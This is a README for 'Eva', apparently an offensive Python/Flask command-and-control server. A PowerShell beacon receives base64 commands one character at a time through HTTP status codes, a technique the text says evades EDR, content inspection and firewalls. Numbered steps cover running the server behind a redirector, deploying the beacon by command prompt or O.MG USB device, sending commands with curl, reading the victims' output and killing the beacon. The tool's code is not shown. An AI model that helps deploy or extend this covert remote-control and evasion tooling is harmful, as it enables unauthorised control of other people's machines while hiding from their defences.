# Eva
**Python C2 Server (via Flask Webhook)**

## About
Eva C2 was created as a minimal command and control server that can be quickly deployed.

This project is a work in progress, and functionality will continue to expand over time.

This server allows you to send base64-encoded commands to a remote computer running a
polling beacon. It supports multiple clients, each maintaining their own command and response stream.

The beacon receives a command one character at a time via HTTP status codes.
Commands are executed once a newline (\n) is received.

By sending one encoded character at a time within the HTTP status code,
this technique avoids using request bodies, query strings, or headers.
This approach helps evade EDR, content inspection, and firewall filtering.

## Usage

```
1. Run the Python Flask C2 server.

    python3 Eva.py

    You can specify a Reverse Proxy or Redirector address and port.

    python3 Eva.py https://proxy-domain.com:443

2. Deploy the generated beacon via Windows command prompt or O.MG USB device.
   The IP address can be manually changed.

3. In a separate terminal, base64-encode the command you want the remote machine to execute.
   Important: Your command MUST end with a newline (`\n`) so the PowerShell script knows when to execute it.

    Example (run command 'whoami' on the remote system):

    echo -en 'whoami\n' | base64
    d2hvYW1pCg==

4. Send the encoded command using curl:

    curl http://127.0.0.1:8000/cmd/d2hvYW1pCg==

    Target a specific OS by appending win, lin, or mac to the /cmd/ path:
    
    curl http://127.0.0.1:8000/cmd/lin/d2hvYW1pCg==

5. View the response log:

    Temporary logs stored in memory:

    curl http://127.0.0.1:8000/cmd/hook

    Persistent logs:

    curl http://127.0.0.1:8000/log/log.txt

6. Clear the log:

    curl http://127.0.0.1:8000/cmd/clean

7. Kill beacon:

    curl http://127.0.0.1:8000/cmd/ZXhpdAo=
```
